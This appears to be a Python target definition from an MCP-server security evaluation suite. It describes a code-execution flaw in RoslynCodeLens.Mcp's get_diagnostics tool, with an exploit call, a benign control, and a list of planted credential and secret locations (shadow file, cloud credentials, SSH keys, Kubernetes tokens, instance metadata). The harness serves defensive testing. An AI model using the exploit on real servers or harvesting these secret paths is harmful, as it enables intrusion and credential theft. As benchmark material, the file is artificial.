"""CVE-2026-45555: RoslynCodeLens.Mcp get_diagnostics arbitrary code execution (CWE-94).

get_diagnostics loads and runs the analyzer assemblies a solution references when includeAnalyzers
is true (its default before 1.17.0), with no allowlist, signature check or confirmation. The image
bakes a malicious solution at /opt/evil-solution whose LeakProbe project references a compiled
Roslyn DiagnosticAnalyzer; the server discovers and trusts that solution at startup, so one
get_diagnostics(includeAnalyzers=true, project="LeakProbe") call runs the analyzer in the server
process, where it reads every planted location and emits each nonce as an EVIL001 diagnostic the
tool returns (reach: command_execution). 1.17.0 adds an analyzer trust model and refuses to run the
untrusted analyzer, so no nonce surfaces.

One call surfaces all kept places (the single analyzer reads them all), so there is one exploit, not
one per place. The benign control runs the same tool with analyzers disabled: clean on both
versions and never aimed. Every kept place is reached only by command_execution; the Roslyn server
never reads those locations itself.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget, LaunchMode
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/opt/evil-solution"  # the baked solution the server discovers and loads at startup
_EVIL_PROJECT = "LeakProbe"

# Every place whose reachable_by lists command_execution and whose kind the planting layer seeds;
# one container plants them all and the single analyzer reads them all in one get_diagnostics.
KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)

# The project name is the one string that distinguishes the analyzer-triggering call from the clean
# control; the benign call carries no project, so it is never aimed.
AIM = re.compile(_EVIL_PROJECT)


async def _exploit(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get_diagnostics", {"includeAnalyzers": True, "project": _EVIL_PROJECT})


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get_diagnostics", {"includeAnalyzers": False})


TARGET = CVETarget(
    cve_id="CVE-2026-45555",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-45555-roslyncodelens",),
    server_image="holdout-2026-45555-roslyncodelens",
    patched_image="holdout-2026-45555-roslyncodelens-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=(_exploit,),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Arbitrary code execution (CWE-94): get_diagnostics loads and runs the Roslyn analyzers a "
        "trusted startup solution references, so a caller-reachable malicious DiagnosticAnalyzer "
        "runs arbitrary code in the server process and returns the planted nonces as diagnostics."
    ),
    tools_filter=None,
    # The layout check breaks the patched version (its trust-model tool revoke_trust errors under
    # the full layout where it did not under the empty reference), so the rule runs both versions
    # in the fallback launch (holdout-rule.md:159). This server's scope is optional, so its fallback
    # is launched without a scope, which for command_injection_env is byte-identical to its normal
    # launch (cve_environments.FALLBACK_SCOPE); the exploit stays live and the target is kept.
    launch_mode=LaunchMode.FALLBACK,
)
